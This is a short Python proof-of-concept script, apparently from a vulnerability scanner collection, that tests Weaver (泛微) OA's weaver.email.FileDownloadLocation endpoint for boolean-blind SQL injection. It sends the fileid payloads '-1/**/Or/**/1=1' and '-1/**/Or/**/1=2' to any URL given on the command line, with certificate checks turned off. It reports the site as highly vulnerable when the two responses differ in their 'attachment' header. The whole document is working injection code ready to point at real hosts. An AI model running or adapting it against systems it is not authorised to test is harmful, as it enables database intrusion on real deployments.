#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA filedownaction SQL注入
referer: https://wooyun.shuimugan.com/bug/view?bug_no=76418
author: Lucifer
description: fileid参数引起的布尔盲注。
'''
import sys
import requests
import warnings
from termcolor import cprint

class weaver_oa_download_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        true_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1"
        false_url = r"/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=2"

        try:
            req1 = requests.get(self.url+true_url, headers=headers, timeout=10, verify=False)
            req2 = requests.get(self.url+false_url, headers=headers, timeout=10, verify=False)
            if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
                cprint("[+]存在泛微OA filedownaction SQL注入漏洞...(高危)\tpayload: "+self.url+true_url, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weaver_oa_download_sqli_BaseVerify(sys.argv[1])
    testVuln.run()